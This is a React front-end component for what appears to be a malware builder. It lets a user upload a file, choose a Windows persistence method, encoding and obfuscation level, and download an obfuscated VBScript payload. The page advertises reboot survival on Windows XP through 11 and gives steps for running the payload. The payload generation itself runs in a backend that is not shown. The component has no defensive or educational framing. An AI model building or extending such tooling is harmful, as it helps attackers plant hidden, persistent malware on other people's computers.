import React, { useState, useEffect, useRef } from 'react';
import apiService from '../services/apiService';

export default function PersistencePayload({ uploadedFile, loading, onGenerate }) {
  const [methods, setMethods] = useState({});
  const [selectedMethod, setSelectedMethod] = useState('multi');
  const [technique, setTechnique] = useState('base64');
  const [obfuscation, setObfuscation] = useState('high');
  const [payload, setPayload] = useState(null);
  const [generating, setGenerating] = useState(false);
  const [error, setError] = useState(null);
  const abortControllerRef = useRef(new AbortController());

  useEffect(() => {
    fetchMethods();
    return () => {
      abortControllerRef.current.abort();
    };
  }, []);

  const fetchMethods = async () => {
    try {
      const controller = new AbortController();
      abortControllerRef.current = controller;
      const response = await apiService.fetchPersistenceMethods(controller.signal);
      if (response.success) {
        setMethods(response.data || {});
      } else {
        console.error('Failed to fetch persistence methods:', response.error);
        setError('Failed to load persistence methods');
      }
    } catch (err) {
      if (err.code !== 'ERR_CANCELED') {
        console.error('Failed to fetch persistence methods', err);
        setError('Failed to load persistence methods');
      }
    }
  };

  const handleGenerate = async () => {
    if (!uploadedFile) {
      setError('Please upload a file first');
      return;
    }

    setGenerating(true);
    setError(null);

    try {
      const controller = new AbortController();
      abortControllerRef.current = controller;

      const response = await apiService.generatePersistent(
        {
          file_id: uploadedFile.id,
          persistence_method: selectedMethod,
          technique: technique,
          obfuscation: obfuscation,
        },
        controller.signal
      );

      if (response.success) {
        setPayload({
          id: response.data.output_id,
          content: response.data.payload,
          size: response.data.size,
          method: response.data.persistence_method,
          methodName: response.data.method_name,
          windowsVersions: response.data.windows_versions,
          survivalRate: response.data.survival_rate,
          advantages: response.data.advantages,
        });
        onGenerate?.(response.data);
      } else {
        setError(response.error?.error || 'Generation failed');
      }
    } catch (err) {
      if (err.code !== 'ERR_CANCELED') {
        setError('Unexpected error during generation');
        console.error('Generation failed:', err);
      }
    } finally {
      setGenerating(false);
    }
  };

  const handleDownload = async () => {
    if (!payload?.id) return;

    try {
      const controller = new AbortController();
      abortControllerRef.current = controller;

      const response = await apiService.downloadFile(payload.id, controller.signal);

      if (response.success) {
        const url = window.URL.createObjectURL(new Blob([response.data]));
        const link = document.createElement('a');
        link.href = url;
        link.setAttribute('download', `persistent_${payload.id}.vbs`);
        document.body.appendChild(link);
        link.click();
        link.parentElement.removeChild(link);
      } else {
        setError('Download failed: ' + response.error?.error);
      }
    } catch (err) {
      if (err.code !== 'ERR_CANCELED') {
        console.error('Download failed:', err);
        setError('Download failed');
      }
    }
  };

  const handleCopy = () => {
    if (payload?.content) {
      navigator.clipboard.writeText(payload.content);
      alert('Copied to clipboard!');
    }
  };

  return (
    <div style={{ padding: '1.5rem' }}>
      <h3 style={{ color: '#00d4ff', marginBottom: '1rem' }}>🔐 Persistent Payload</h3>

      <p style={{ color: '#a0a0a0', marginBottom: '1rem', fontSize: '0.9rem' }}>
        <strong>Survives reboots on all Windows versions (XP through 11)</strong>
      </p>
      {error && (
        <div
          style={{
            marginBottom: '1rem',
            padding: '0.8rem',
            backgroundColor: 'rgba(255, 107, 107, 0.1)',
            border: '1px solid rgba(255, 107, 107, 0.3)',
            borderRadius: '4px',
            color: '#ff6b6b',
            fontSize: '0.9rem',
          }}
        >
          {error}
        </div>
      )}

      <div className="form-group">
        <label style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <span>Persistence Method</span>
          {selectedMethod === 'multi' && (
            <span
              style={{
                fontSize: '0.75rem',
                padding: '0.3rem 0.6rem',
                backgroundColor: 'rgba(76, 175, 80, 0.3)',
                border: '1px solid rgba(76, 175, 80, 0.6)',
                borderRadius: '4px',
                color: '#4caf50',
                fontWeight: 'bold',
              }}
            >
              ⭐ RECOMMENDED (99%+ survival)
            </span>
          )}
        </label>
        <p style={{ fontSize: '0.85rem', color: '#a0a0a0', margin: '0.5rem 0' }}>
          Choose method based on your target Windows version and requirements:
        </p>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.8rem' }}>
          {Object.entries(methods).map(([key, desc]) => (
            <div
              key={key}
              className={`fingerprint-card ${selectedMethod === key ? 'selected' : ''}`}
              onClick={() => setSelectedMethod(key)}
              style={{
                cursor: 'pointer',
                borderColor:
                  key === 'multi' && selectedMethod !== 'multi'
                    ? 'rgba(76, 175, 80, 0.5)'
                    : undefined,
              }}
            >
              <div className="fingerprint-name">
                {key.toUpperCase()}
                {key === 'multi' ? ' ⭐' : ''}
              </div>
              <div className="fingerprint-desc" style={{ fontSize: '0.75rem' }}>
                {desc.substring(0, 50)}...
              </div>
            </div>
          ))}
        </div>
      </div>

      <div className="form-group">
        <label>Encoding Technique:</label>
        <select
          value={technique}
          onChange={(e) => setTechnique(e.target.value)}
        >
          <option value="base64">Base64</option>
          <option value="hex">Hex</option>
          <option value="multi">Multi-Encoding</option>
          <option value="direct">Direct</option>
        </select>
      </div>

      <div className="form-group">
        <label>Obfuscation Level:</label>
        <div style={{ display: 'flex', gap: '0.5rem' }}>
          {['low', 'medium', 'high'].map((level) => (
            <button
              key={level}
              className={`btn-secondary ${obfuscation === level ? 'active' : ''}`}
              onClick={() => setObfuscation(level)}
              style={{
                flex: 1,
                textTransform: 'capitalize',
                backgroundColor:
                  obfuscation === level
                    ? 'rgba(0, 212, 255, 0.3)'
                    : 'rgba(0, 212, 255, 0.05)',
              }}
            >
              {level}
            </button>
          ))}
        </div>
      </div>

      <button
        className="btn-primary"
        onClick={handleGenerate}
        disabled={!uploadedFile || generating}
        style={{ width: '100%' }}
      >
        {generating ? '⏳ Generating...' : '🔐 Generate Persistent Payload'}
      </button>

      <div style={{ marginTop: '1rem', fontSize: '0.85rem', color: '#a0a0a0' }}>
        <p>
          💡 <strong>Persistent Payload:</strong> Survives reboots, system restart, and user
          logoff. Works on all Windows versions.
        </p>
      </div>

      {payload && (
        <div
          style={{
            marginTop: '1.5rem',
            padding: '1rem',
            backgroundColor: 'rgba(76, 175, 80, 0.1)',
            border: '1px solid rgba(76, 175, 80, 0.3)',
            borderRadius: '6px',
          }}
        >
          <h4 style={{ color: '#4caf50', marginTop: 0 }}>✓ Persistent Payload Generated</h4>

          <div style={{ marginBottom: '1rem' }}>
            <p>
              <strong>Method:</strong> {payload.methodName}
            </p>
            <p>
              <strong>Windows Versions:</strong> {payload.windowsVersions}
            </p>
            <p>
              <strong>Survival Rate:</strong> <span style={{ color: '#00d4ff' }}>{payload.survivalRate}</span>
            </p>
            <p>
              <strong>Payload Size:</strong> {(payload.size / 1024).toFixed(2)} KB
            </p>
          </div>

          <div style={{ marginBottom: '1rem' }}>
            <p style={{ color: '#4caf50', fontWeight: 'bold' }}>✓ Advantages:</p>
            <ul style={{ marginLeft: '1.5rem', color: '#a0a0a0' }}>
              {payload.advantages.map((adv, idx) => (
                <li key={idx}>{adv}</li>
              ))}
            </ul>
          </div>

          <div
            style={{
              marginBottom: '1rem',
              padding: '0.8rem',
              backgroundColor: 'rgba(0, 0, 0, 0.3)',
              borderRadius: '4px',
            }}
          >
            <p style={{ color: '#a0a0a0', fontSize: '0.85rem', marginTop: 0 }}>
              <strong>Installation:</strong>
            </p>
            <p style={{ color: '#a0a0a0', fontSize: '0.85rem' }}>
              1. Download the payload file<br />
              2. Run with: <code>cscript payload.vbs</code> or double-click<br />
              3. Installation persists through reboots<br />
              4. Works on Windows XP through Windows 11
            </p>
          </div>

          <div style={{ display: 'flex', gap: '0.8rem', flexWrap: 'wrap' }}>
            <button className="btn-primary" onClick={handleDownload}>
              💾 Download Payload
            </button>
            <button className="btn-secondary" onClick={handleCopy}>
              📋 Copy Code
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
